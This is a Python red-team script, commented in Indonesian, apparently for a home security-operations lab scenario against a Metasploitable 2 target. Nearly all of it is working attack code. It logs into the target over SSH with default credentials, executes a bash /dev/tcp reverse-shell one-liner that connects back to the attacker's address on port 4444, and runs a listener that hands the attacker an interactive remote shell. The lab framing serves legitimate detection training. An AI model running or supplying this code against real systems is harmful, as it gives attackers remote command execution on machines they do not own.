#!/usr/bin/env python3
"""
=============================================================
  Mini SOC Project — Person A (Red Team)
  Scenario 3: Reverse Shell
=============================================================
  Target  : Metasploitable 2 @ 192.168.1.40
  Attacker: Kali Linux       @ 192.168.1.10
  Tactic  : T1059 - Command & Scripting Interpreter (MITRE ATT&CK)
            T1071 - Application Layer Protocol
  Tools   : paramiko (SSH), socket (listener)
=============================================================
  Cara kerja:
    1. Script buka listener di port 4444 (Laptop A)
    2. Script SSH masuk ke Metasploitable pakai credential hasil Scenario 2
    3. Dari dalam Metasploitable, jalankan bash reverse shell → konek balik ke 192.168.1.10:4444
    4. Attacker dapat interactive shell dari target
=============================================================
"""

import paramiko
import socket
import threading
import time
import datetime
import sys

# ── Konfigurasi ──────────────────────────────────────────
TARGET_IP     = "192.168.1.40"
TARGET_PORT   = 22
ATTACKER_IP   = "192.168.1.10"   # IP Laptop A — listener di sini
LISTEN_PORT   = 4444

# Credential dari hasil Scenario 2
SSH_USER      = "msfadmin"
SSH_PASS      = "msfadmin"

# Reverse shell payload (bash one-liner)
# Dijalankan di dalam Metasploitable via SSH
REVSHELL_CMD  = (
    f"bash -i >& /dev/tcp/{ATTACKER_IP}/{LISTEN_PORT} 0>&1"
)
# ─────────────────────────────────────────────────────────

BANNER = """
╔══════════════════════════════════════════════════════╗
║        MINI SOC — SCENARIO 3: REVERSE SHELL          ║
║  Target  : {target:<38} ║
║  Listener: {listener:<38} ║
║  Time    : {time:<38} ║
╚══════════════════════════════════════════════════════╝
"""


# ══════════════════════════════════════════════════════════
#  BAGIAN 1: Listener — terima koneksi balik dari target
# ══════════════════════════════════════════════════════════

def start_listener(listen_ip: str, listen_port: int):
    """
    Buka TCP listener di ATTACKER_IP:LISTEN_PORT.
    Saat target konek balik, masuk ke interactive shell loop.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((listen_ip, listen_port))
    except OSError as e:
        print(f"[!] Gagal bind {listen_ip}:{listen_port} — {e}")
        print(f"[!] Coba: sudo lsof -i :{listen_port}  lalu kill prosesnya.")
        sys.exit(1)

    server.listen(1)
    print(f"[*] Listener aktif di {listen_ip}:{listen_port}")
    print(f"[*] Menunggu koneksi balik dari target...\n")

    server.settimeout(30)   # timeout 30 detik kalau target tidak konek

    try:
        conn, addr = server.accept()
    except socket.timeout:
        print("[!] Timeout — target tidak konek dalam 30 detik.")
        print("[!] Pastikan reverse shell berhasil dieksekusi di target.")
        server.close()
        return

    print(f"[+] ✅ KONEKSI MASUK dari {addr[0]}:{addr[1]}")
    print(f"[+] Reverse shell aktif! Ketik perintah di bawah:\n")
    print(f"{'═'*54}")

    # Interactive shell loop
    try:
        while True:
            print("shell> ", end="", flush=True)
            cmd = input()

            if not cmd.strip():
                continue

            if cmd.strip().lower() in ("exit", "quit", "q"):
                conn.send(b"exit\n")
                break

            conn.send((cmd + "\n").encode())

            # Terima output
            conn.settimeout(3)
            output = b""
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    output += chunk
            except socket.timeout:
                pass

            if output:
                print(output.decode(errors="replace"), end="")

    except (KeyboardInterrupt, EOFError):
        print("\n[*] Sesi dihentikan oleh attacker.")
    finally:
        conn.close()
        server.close()
        print(f"\n{'═'*54}")
        print("[*] Listener ditutup.")


# ══════════════════════════════════════════════════════════
#  BAGIAN 2: Trigger — SSH ke target & eksekusi reverse shell
# ══════════════════════════════════════════════════════════

def trigger_reverseshell(target: str, port: int, user: str, password: str, cmd: str):
    """
    SSH masuk ke target, lalu jalankan reverse shell payload.
    Fungsi ini dipanggil di thread terpisah setelah listener siap.
    """
    time.sleep(2)   # tunggu listener siap dulu

    print(f"[*] SSH ke {target}:{port} sebagai {user}...")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname     = target,
            port         = port,
            username     = user,
            password     = password,
            timeout      = 10,
        )
        print(f"[+] SSH berhasil! Mengeksekusi reverse shell payload...")
        print(f"[*] Payload: {cmd}\n")

        # Eksekusi — ini akan langsung konek balik ke listener
        # get_pty=True supaya dapat interactive shell
        stdin, stdout, stderr = client.exec_command(cmd, get_pty=True, timeout=60)

    except paramiko.AuthenticationException:
        print(f"[!] SSH auth gagal — pastikan credential benar ({user}:{password})")
        print(f"[!] Jalankan Scenario 2 dulu untuk mendapatkan credential yang valid.")
    except (socket.timeout, paramiko.SSHException, OSError) as e:
        print(f"[!] SSH error: {e}")
    finally:
        # Jangan langsung close — biarkan reverse shell hidup
        pass


# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════

if __name__ == "__main__":
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(BANNER.format(
        target   = f"{TARGET_IP}:{TARGET_PORT}",
        listener = f"{ATTACKER_IP}:{LISTEN_PORT}",
        time     = now,
    ))

    print(f"[*] Step 1: Membuka listener di {ATTACKER_IP}:{LISTEN_PORT}")
    print(f"[*] Step 2: SSH ke {TARGET_IP} → trigger reverse shell")
    print(f"[*] Step 3: Target konek balik → interactive shell\n")

    # Jalankan SSH trigger di thread terpisah
    # supaya listener bisa siap dulu sebelum payload dikirim
    trigger_thread = threading.Thread(
        target = trigger_reverseshell,
        args   = (TARGET_IP, TARGET_PORT, SSH_USER, SSH_PASS, REVSHELL_CMD),
        daemon = True,
    )
    trigger_thread.start()

    # Listener jalan di main thread (blocking)
    start_listener(ATTACKER_IP, LISTEN_PORT)